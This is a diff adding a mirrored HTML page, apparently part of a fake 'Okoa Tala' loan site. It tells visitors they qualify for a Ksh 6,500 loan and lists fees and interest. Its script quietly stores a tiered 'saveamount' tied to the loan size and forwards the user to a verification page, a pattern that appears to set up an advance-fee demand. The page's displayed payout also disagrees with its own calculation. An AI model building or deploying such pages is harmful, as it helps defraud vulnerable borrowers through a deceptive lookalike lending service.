@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from okoatala-cash.vercel.app/upplication-details.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Jul 2025 09:42:15 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Loan Eligibility - Fresh Design</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap');
+
+  body {
+    margin: 0;
+    background: linear-gradient(135deg, #de20b2, #b18155);
+    font-family: 'Poppins', sans-serif;
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .container {
+    background: #1e1e2f;
+    border-radius: 20px;
+    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+    max-width: 400px;
+    width: 100%;
+    padding: 30px 25px;
+    text-align: center;
+  }
+
+  h1 {
+    margin-bottom: 10px;
+    font-weight: 600;
+    font-size: 1.8rem;
+    color: #a8e6cf;
+  }
+
+  p.subtitle {
+    font-size: 0.9rem;
+    color: #cfd8dc;
+    margin-bottom: 30px;
+    line-height: 1.4;
+  }
+
+  .loan-amount {
+    font-size: 2.8rem;
+    font-weight: 700;
+    margin-bottom: 8px;
+    color: #dcedc1;
+  }
+
+  .term-info {
+    font-size: 1rem;
+    margin-bottom: 30px;
+    color: #b0bec5;
+  }
+
+  .details {
+    background: #2c2c48;
+    border-radius: 15px;
+    padding: 20px;
+    margin-bottom: 30px;
+    text-align: left;
+  }
+
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 15px;
+    font-weight: 500;
+    color: #cfd8dc;
+  }
+
+  .detail-row span.value {
+    color: #a8e6cf;
+    font-weight: 700;
+  }
+
+  .btn-apply {
+    background: linear-gradient(135deg, #de20b2, #b18155);
+    border: none;
+    padding: 15px 0;
+    width: 100%;
+    font-size: 1.2rem;
+    font-weight: 600;
+    color: #fff;
+    border-radius: 40px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+
+  .btn-apply:hover {
+    background: linear-gradient(135deg, #de20b2, #b18155);
+  }
+
+  .footer {
+    margin-top: 25px;
+    font-size: 0.85rem;
+    color: #8696a7;
+  }
+</style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Congratulations!</h1>
+    <p class="subtitle">You qualify for a loan with favorable terms. Early settlement may reduce interest.</p>
+
+    <div class="loan-amount" id="limit">Ksh 6,500</div>
+    <div class="term-info">Term: <strong>14 days</strong> &nbsp;&nbsp;|&nbsp;&nbsp; Receive Amount: <strong id="received">Ksh 5,344</strong></div>
+
+    <div class="details">
+      <div class="detail-row">
+        <span>Awarded Loan Amount</span>
+        <span class="value" id="limit1">Ksh 6,500</span>
+      </div>
+      <div class="detail-row">
+        <span>Service Fee</span>
+        <span class="value" id="Servicefee">Ksh 636</span>
+      </div>
+      <div class="detail-row">
+        <span>Interest Rate</span>
+        <span class="value" id="user-nam">8%</span>
+      </div>
+      <div class="detail-row">
+        <span>Interest Applied (8%)</span>
+        <span class="value" id="interestrate">Ksh 520</span>
+      </div>
+      <div class="detail-row">
+        <span>Disburseable Amount</span>
+        <span class="value" id="received1">Ksh 5,344</span>
+      </div>
+    </div>
+
+    <button class="btn-apply" onclick="goToSecondPage()">Apply Now</button>
+
+    <div class="footer">© Okoa Tala 2025</div>
+  </div>
+
+  <script>
+    // Your existing logic to populate values here (simplified example)
+    let limit = document.getElementById('limit');
+    let limit1 = document.getElementById('limit1');
+    let Servicefee = document.getElementById('Servicefee');
+    let interestrate = document.getElementById('interestrate');
+    let received = document.getElementById('received');
+    let received1 = document.getElementById('received1');
+
+    let lims = parseFloat(localStorage.getItem('limit')) || 6500;
+
+    limit.textContent = "Ksh " + lims.toFixed(2);
+    limit1.textContent = "Ksh " + lims.toFixed(2);
+
+    let fee = 0, savingamount = 0;
+
+    if (lims >= 35000) {
+      fee = 1062;
+      savingamount = 1540;
+   } else if (lims >= 30000) {
+      fee = 942;
+      savingamount = 1840;
+   } else if (lims >= 16000) {
+      fee = 842;
+      savingamount = 945;
+    } else if (lims >= 10000) {
+      fee = 522;
+      savingamount = 445;
+    } else if (lims >= 4000) {
+      fee = 322;
+      savingamount = 255;
+    } else {
+      fee = 156;
+      savingamount = 155;
+    }
+
+    localStorage.setItem('saveamount', savingamount);
+
+    let interestR = lims * 0.08;
+    interestrate.textContent = "Ksh " + interestR.toFixed(2);
+    Servicefee.textContent = "Ksh " + fee.toFixed(2);
+
+    let receiveable = lims - (interestR + fee);
+    received.textContent = "Ksh " + receiveable.toFixed(2);
+    received1.textContent = "Ksh " + receiveable.toFixed(2);
+
+    function goToSecondPage() {
+ //     alert('Proceed to next step');
+       window.location.href = 'Verification.html'; // uncomment to navigate
+    }
+  </script>
+
+</body>
+
+<!-- Mirrored from okoatala-cash.vercel.app/upplication-details.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Jul 2025 09:42:16 GMT -->
+</html>
